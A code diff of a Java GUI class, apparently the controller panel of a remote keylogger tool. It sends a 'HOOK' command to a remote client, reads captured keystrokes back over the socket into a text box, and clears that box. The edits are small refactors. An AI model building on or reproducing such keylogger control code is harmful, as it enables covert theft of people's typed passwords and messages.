@@ -27,7 +27,8 @@ public class KeylogListener implements ActionListener{
 		}
 		
 		String click = e.getActionCommand();
-		
+		String keylogString = null;
+		String tempString =  null;
 		boolean isHook = false;
 		
 		if ("HOOK".equals(click))
@@ -38,7 +39,7 @@ public class KeylogListener implements ActionListener{
 				Client.out.flush();
 			} catch (IOException e2) {
 				e2.printStackTrace();
-			}	
+			}			
 			//JOptionPane.showMessageDialog(null, "Start Hook");	
 		}
 		
@@ -65,23 +66,19 @@ public class KeylogListener implements ActionListener{
 				e2.printStackTrace();
 			}
 			
-				String outString = "";
-		        try {
-					outString = Client.in.readLine();
-				} catch (IOException e1) {
-					e1.printStackTrace();
-				}
-		        outString = outString.trim();
-		        
-		        this.keylogDesign.txtKeylog.append(outString); 
-		        
+			try {
+				keylogString = Client.in.readLine();
+			} catch (IOException e1) {
+				// TODO Auto-generated catch block
+				e1.printStackTrace();
+			}
+		    this.keylogDesign.txtKeylog.append(keylogString); 
+	  
 		        
 		}
 		else if ("CLEAR TEXT".equals(click))
-		{
-//			
-			this.keylogDesign.txtKeylog.setText("");
-//			
+		{			
+			this.keylogDesign.txtKeylog.setText("");		
 		}
 		
 	}
